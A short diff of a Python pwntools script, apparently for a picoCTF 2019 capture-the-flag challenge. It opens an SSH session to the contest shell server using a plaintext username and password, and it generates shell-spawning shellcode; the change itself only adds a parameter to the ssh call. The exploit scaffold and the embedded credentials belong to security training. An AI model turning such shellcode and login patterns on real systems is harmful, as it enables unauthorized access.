@@ -1,6 +1,6 @@
 from pwn import *
 
-session = ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard")
+session = ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard", level=50)
 
 sc = shellcraft.sh()
 
